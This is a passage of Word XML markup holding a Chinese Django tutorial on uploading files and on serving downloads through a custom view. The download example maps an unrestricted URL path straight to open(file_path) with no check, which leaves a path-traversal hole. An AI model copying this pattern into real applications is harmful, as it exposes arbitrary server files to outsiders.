    <w:p w14:paraId="08B44D2F" w14:textId="12C1FD75" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    return JsonResponse({'error_msg': 'only POST method accpeted.'})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0801B9F4" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>GitHub源码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FB10015" w14:textId="7170E304" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>https://github.com/shiyunbo/django-file-upload-download</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="245CFFD8" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>小结</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="255CCB8C" w14:textId="0B37A991" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>本文提供并解读了利用Django上传文件的3种主要方式(一般表单上传，ModelForm上传和Ajax上传)及示范代码。我们后续会专题讲解多文件上传和文件下载(如大文件下载), 欢迎关注我们的微信公众号。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="472E5C83" w14:textId="25685E79" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果喜欢本文就加入微信收藏或点赞吧。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="589FE5A1" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>大江狗</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ED39C2B" w14:textId="58BA8749" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2018.10.21</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="169F47F1" w14:textId="033453D0" w:rsidR="001C47AF" w:rsidRDefault="00230D30" w:rsidP="00230D30">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041</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="27"/>
          <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:hyperlink r:id="rId275" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF" w:rsidRPr="00230D30">
          <w:rPr>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:b/>
            <w:color w:val="4D4D4D"/>
            <w:sz w:val="30"/>
            <w:szCs w:val="27"/>
            <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
          </w:rPr>
          <w:t>Django基础(18): 实现文件下载的3种方法及文件私有化</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="18B676E3"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Django基础(18): 实现文件下载的3种方法及文件私有化</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AFB8ED3"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原创 大江狗 </w:t>
      </w:r>
      <w:hyperlink r:id="rId276" w:history="1">
        <w:r w:rsidRPr="00230D30">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Python Web与Django开发</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> 2018-10-24</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FA2FC83"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来自专辑</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ABDE87B"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Django基础连载</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="628CAE0B"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在前篇教程里，我们讲解了如何利用Django上传文件，今天我们就来讲解下如何利用Django处理文件下载，并谈下文件私有化的大概思路。本文是在前篇基础上写的，所以项目相关配置方面参阅前篇内容。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DD3FDAF" w14:textId="002EA16A" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00D96E02" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId277" w:anchor="wechat_redirect" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidR="00230D30" w:rsidRPr="00230D30">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Django基础(17): 如何上传处理文件及Ajax文件上传示范(附GitHub源码)</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="14F3C4D7" w14:textId="5FF04477" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>为什么需要编写下载视图方法?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66D31A09"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你或许知道，我们上传的文件默认放在media文件夹中的，且Django会为每个上传的静态文件分配一个静态url。在模板中，你可以使用{{ mymodel.file.url }}获取每个文件的链接(url)，浏览器也是可以直接打开这个url的，如下所示。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B9AB25F" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;td&gt;&lt;a href="/media/files/b1957d79f3.JPG/"&gt;/media/files/b1957d79f3.JPG&lt;/a&gt;&lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08B9BDF5"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然而当你碰到如下2种情况时，你需要编写自己的视图下载方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58B91281"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你希望用户以附件形式获得文件，而不是浏览器直接打开。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78B846DE" w14:textId="1C3670AB" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>你希望允许用户下载一些保密文件，而不希望在html模板中暴露它们。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64F8C364" w14:textId="76C26F58" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>具体思路</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="366CCBF7"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我们先新建一个file_download的app，添加如下urls。该URL了包含了一个文件的相对路径file_path作为参数, 其对应视图是file_download方法。我们现在就开始尝试用不同方法来处理文件下载。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="157F0025" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.urls import path, re_path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73AC924C" w14:textId="1306E97A" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from . import views</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A41D377" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># namespace</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45882F04" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>app_name = 'file_download'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F81F5E1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5CE2FBEE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>urlpatterns = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77D8EB7E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="439AF866" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    re_path(r'^download/(?P&lt;file_path&gt;.*)/$', views.file_download, name='file_download'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2860478B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="06D98725" w14:textId="2B38429D" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="622243B2"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模板templates/file_upload/file_list.html改为如下所示, 而不再采用option 1。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36BC8EF5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% for file in files %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7975925E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;tr&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="128B2038" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    &lt;!-- Option 1 &lt;td&gt;&lt;a href="{{ file.file.url }}/"&gt;{{ file.file.url }}&lt;/a&gt;&lt;/td&gt; --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B240D8E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    &lt;td&gt;&lt;a href="/file/download{{ file.file.url }}/"&gt;{{ file.file.url }}&lt;/a&gt;&lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44B57746" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    &lt;td&gt;{{ file.file.size | filesizeformat }}&lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D52B86E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    &lt;td&gt;{{ file.upload_method }}&lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D984187" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;/tr&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="578BF8C7" w14:textId="097A22DE" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% endfor %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FD3C076" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1ECA60EE" w14:textId="00388304" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>方法一: 使用HttpResonse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54F54654"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下面方法从url获取file_path, 打开文件，读取文件，然后通过HttpResponse方法输出。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A8E72A8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>import os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CF2A30E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.http import HttpResponse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54AD74E0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="789C00A3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def file_download(request, file_path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62DB6500" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    # do something...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CB2AB51" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    with open(file_path) as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E658CB1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        c = f.read()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6097E360" w14:textId="7D631D3C" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
